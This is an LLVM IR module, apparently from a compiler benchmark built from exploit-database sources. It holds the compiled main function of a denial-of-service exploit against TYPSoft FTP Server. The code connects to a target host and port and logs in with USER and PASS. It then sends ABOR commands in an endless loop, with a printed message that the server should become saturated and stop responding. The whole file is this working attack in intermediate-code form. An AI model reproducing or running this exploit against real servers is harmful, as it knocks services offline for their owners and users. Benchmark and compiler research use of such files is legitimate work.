; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_8650.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_8650.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [26 x i8] c"[+]TYPSoft FTP Server %s\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [20 x i8] c"[+]Connexion\09\09[OK]\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [32 x i8] c"[-]Send Request User\09\09[FAILED]\0A\00", align 1
@.str.4 = private unnamed_addr constant [23 x i8] c"[+]USER request\09\09[OK]\0A\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"[-]Send Request PASS\09\09[FAILED]\0A\00", align 1
@.str.7 = private unnamed_addr constant [23 x i8] c"[+]PASS request\09\09[OK]\0A\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"ABOR\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [74 x i8] c"[+]If exploit is active, the server is saturated, it stops responding...\0A\00", align 1
@.str.10 = private unnamed_addr constant [32 x i8] c"[-]Send Request ABOR\09\09[FAILED]\0A\00", align 1
@.str.11 = private unnamed_addr constant [22 x i8] c"[-]Connect\09\09[FAILED]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca [200 x i8], align 16
  %13 = alloca [500 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @syntax(i8* %19)
  br label %21

21:                                               ; preds = %16, %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @atoi(i8* %24)
  store i32 %25, i32* %6, align 4
  store i32 12, i32* %10, align 4
  %26 = load i32, i32* @AF_INET, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %26, i32* %27, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @inet_addr(i8* %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 0
  store i32 %31, i32* %33, align 4
  %34 = load i32, i32* %6, align 4
  %35 = call i32 @htons(i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i32 %35, i32* %36, align 4
  %37 = load i32, i32* @stdout, align 4
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %37, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i8* %40)
  %42 = load i32, i32* @AF_INET, align 4
  %43 = load i32, i32* @SOCK_STREAM, align 4
  %44 = call i32 @socket(i32 %42, i32 %43, i32 0)
  store i32 %44, i32* %8, align 4
  %45 = load i32, i32* %8, align 4
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %21
  store i32 1, i32* %3, align 4
  br label %115

48:                                               ; preds = %21
  %49 = load i32, i32* %8, align 4
  %50 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %51 = load i32, i32* %10, align 4
  %52 = call i32 @connect(i32 %49, %struct.sockaddr* %50, i32 %51)
  store i32 %52, i32* %9, align 4
  %53 = load i32, i32* %9, align 4
  %54 = icmp ne i32 %53, -1
  br i1 %54, label %55, label %110

55:                                               ; preds = %48
  %56 = load i32, i32* %8, align 4
  %57 = getelementptr inbounds [500 x i8], [500 x i8]* %13, i64 0, i64 0
  %58 = call i32 @recv(i32 %56, i8* %57, i32 500, i32 0)
  %59 = load i32, i32* @stdout, align 4
  %60 = call i32 (i32, i8*, ...) @fprintf(i32 %59, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %61 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 3
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 (i8*, i8*, ...) @sprintf(i8* %61, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* %64)
  %66 = load i32, i32* %8, align 4
  %67 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %68 = call i32 @send(i32 %66, i8* %67, i32 200, i32 0)
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %75

70:                                               ; preds = %55
  %71 = load i32, i32* @stderr, align 4
  %72 = call i32 (i32, i8*, ...) @fprintf(i32 %71, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %73 = load i32, i32* %8, align 4
  %74 = call i32 @shutdown(i32 %73, i32 1)
  store i32 1, i32* %3, align 4
  br label %115

75:                                               ; preds = %55
  %76 = load i32, i32* @stdout, align 4
  %77 = call i32 (i32, i8*, ...) @fprintf(i32 %76, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  %78 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 4
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 (i8*, i8*, ...) @sprintf(i8* %78, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i8* %81)
  %83 = load i32, i32* %8, align 4
  %84 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %85 = call i32 @send(i32 %83, i8* %84, i32 200, i32 0)
  %86 = icmp eq i32 %85, -1
  br i1 %86, label %87, label %92

87:                                               ; preds = %75
  %88 = load i32, i32* @stderr, align 4
  %89 = call i32 (i32, i8*, ...) @fprintf(i32 %88, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %90 = load i32, i32* %8, align 4
  %91 = call i32 @shutdown(i32 %90, i32 1)
  store i32 1, i32* %3, align 4
  br label %115

92:                                               ; preds = %75
  %93 = load i32, i32* @stdout, align 4
  %94 = call i32 (i32, i8*, ...) @fprintf(i32 %93, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0))
  %95 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %96 = call i32 (i8*, i8*, ...) @sprintf(i8* %95, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %97 = load i32, i32* @stdout, align 4
  %98 = call i32 (i32, i8*, ...) @fprintf(i32 %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.9, i64 0, i64 0))
  br label %99

99:                                               ; preds = %92, %109
  %100 = load i32, i32* %8, align 4
  %101 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %102 = call i32 @send(i32 %100, i8* %101, i32 200, i32 0)
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %109

104:                                              ; preds = %99
  %105 = load i32, i32* @stderr, align 4
  %106 = call i32 (i32, i8*, ...) @fprintf(i32 %105, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0))
  %107 = load i32, i32* %8, align 4
  %108 = call i32 @shutdown(i32 %107, i32 1)
  store i32 1, i32* %3, align 4
  br label %115

109:                                              ; preds = %99
  br label %99

110:                                              ; preds = %48
  %111 = load i32, i32* @stderr, align 4
  %112 = call i32 (i32, i8*, ...) @fprintf(i32 %111, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i64 0, i64 0))
  %113 = load i32, i32* %8, align 4
  %114 = call i32 @shutdown(i32 %113, i32 1)
  store i32 1, i32* %3, align 4
  br label %115

115:                                              ; preds = %110, %104, %87, %70, %47
  %116 = load i32, i32* %3, align 4
  ret i32 %116
}

declare dso_local i32 @syntax(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @shutdown(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
